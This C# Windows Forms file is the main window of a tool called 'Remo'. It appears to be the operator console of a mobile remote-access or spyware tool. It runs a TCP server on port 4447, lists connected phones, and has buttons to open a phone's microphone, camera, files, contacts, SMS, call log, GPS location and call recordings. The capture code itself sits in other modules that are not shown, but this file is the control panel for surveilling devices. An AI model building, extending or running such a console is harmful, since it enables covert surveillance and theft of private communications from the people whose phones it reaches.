using Remo.Connections;
using Remo.Features;
//using SimpleTCP;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Remo
{
    public partial class MainForm : Form
    {
        TCP mTCPH;
        //UDPReceiver udpr;
        //mUDPHandler mUDPH;
        private Thread RefreshClientsListThread;
        volatile bool Stop = false;
        public static int Port = 4447;
        //private string SelectedClientIP = "";
        //MobInfo mi;

        public MainForm()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            CheckForIllegalCrossThreadCalls = false;


        }

        private void btnStart_Click(object sender, EventArgs e)
        {
            //Start handler
            mTCPH = ServerFactory.GetInstance();
           // mTCPH.StartServer(4447);

      //      mTCPH.ClientClass = new Client();
            //udpr = UDPReceiver.GetInstance(4447);
            //Thread.Sleep(5000);

            //mUDPH = mUDPHandler.GetInstance();

            RefreshClientsListThread = new Thread(delegate ()
            {
                while (!Stop)
                {
                    try
                    {
                        this.Invoke((MethodInvoker)delegate
                        {

                            RefreshClientsList();
                        });
                    }
                    finally {
                        Thread.Sleep(5000);
                    }


                    
                    
                }
            });

            RefreshClientsListThread.Start();
        }



        private void btnMic_Click(object sender, EventArgs e)
        {

            mTCPH.startFeature(getSelectedClientIP(), (int)DataHandler.eDataType.MIC).Show();

        }

        private void btnCam_Click(object sender, EventArgs e)
        {
            mTCPH.startFeature(getSelectedClientIP(), (int)DataHandler.eDataType.CAM).Show();
        }
        

        private void btnFM_Click(object sender, EventArgs e)
        {
            mTCPH.startFeature(getSelectedClientIP(), (int)DataHandler.eDataType.FM_LIST).Show();
        }

        private void btnContacts_Click(object sender, EventArgs e)
        {
            mTCPH.startFeature(getSelectedClientIP(), (int)DataHandler.eDataType.CONTACTS).Show();
        }
        private void btnSMS_Click(object sender, EventArgs e)
        {
            mTCPH.startFeature(getSelectedClientIP(), (int)DataHandler.eDataType.SMS).Show();
        }

        private void RefreshClientsList()
        {
            int saveRow = -1;
            if (dgv1.Rows.Count > 0 && dgv1.SelectedRows[0] != null)
                saveRow = dgv1.SelectedRows[0].Index;
            dgv1.Rows.Clear();
                foreach (IConnection c in mTCPH.MainConnectionsDict.Values.ToList())
                {
                if(!c.Features.ContainsKey((int)DataHandler.eDataType.INFO))
                    mTCPH.startFeature(c.IP, (int)DataHandler.eDataType.INFO).Show();
                dgv1.Rows.Add(((MobInfo)c.Features[(int)DataHandler.eDataType.INFO]).getInfo());
                }
            if (saveRow != -1 && saveRow < dgv1.Rows.Count)
                dgv1.Rows[saveRow].Selected = true;
            //  dgv1.Rows[Selected].Selected = true;


        }

        private String getSelectedClientIP()
        {
            Console.WriteLine(dgv1.SelectedRows[0].Cells[0].Value.ToString());
            return dgv1.SelectedRows[0].Cells[0].Value.ToString();
        }

        private void btnStop_Click(object sender, EventArgs e)
        {
            stop();
        }

        //Release recources
        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            stop();
        }
        private void stop()
        {
            try
            {
                Stop = true;
                mTCPH.StopServer();
                mTCPH = null;
                
                //udpr.StopReceive();
                
                RefreshClientsListThread.Abort();
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
        }

        private void dgv1_SelectionChanged(object sender, EventArgs e)
        {
            //try
            //{
            //    SelectedClientIP = dgv1.CurrentCell.OwningRow.Cells[0].Value.ToString();
            //}
            //catch { }
        }

        private void camToolStripMenuItem_Click(object sender, EventArgs e)
        {
            mTCPH.startFeature(getSelectedClientIP(), (int)DataHandler.eDataType.CAM).Show();
        }

        private void micToolStripMenuItem_Click(object sender, EventArgs e)
        {
            mTCPH.startFeature(getSelectedClientIP(), (int)DataHandler.eDataType.MIC).Show();
        }

        private void fileManagerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            mTCPH.startFeature(getSelectedClientIP(), (int)DataHandler.eDataType.FM_LIST).Show();
        }

        private void contactsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            mTCPH.startFeature(getSelectedClientIP(), (int)DataHandler.eDataType.CONTACTS).Show();
        }

        private void sMSToolStripMenuItem_Click(object sender, EventArgs e)
        {
            mTCPH.startFeature(getSelectedClientIP(), (int)DataHandler.eDataType.SMS).Show();
        }

        private void callLogToolStripMenuItem_Click(object sender, EventArgs e)
        {
            mTCPH.startFeature(getSelectedClientIP(), (int)DataHandler.eDataType.CALL_LOG).Show();
        }

        private void gPSToolStripMenuItem_Click(object sender, EventArgs e)
        {
            mTCPH.startFeature(getSelectedClientIP(), (int)DataHandler.eDataType.GPS).Show();
        }

        private void callRecorderToolStripMenuItem_Click(object sender, EventArgs e)
        {
            mTCPH.startFeature(getSelectedClientIP(), (int)DataHandler.eDataType.CALL_RECORDS).Show();
        }
    }
}
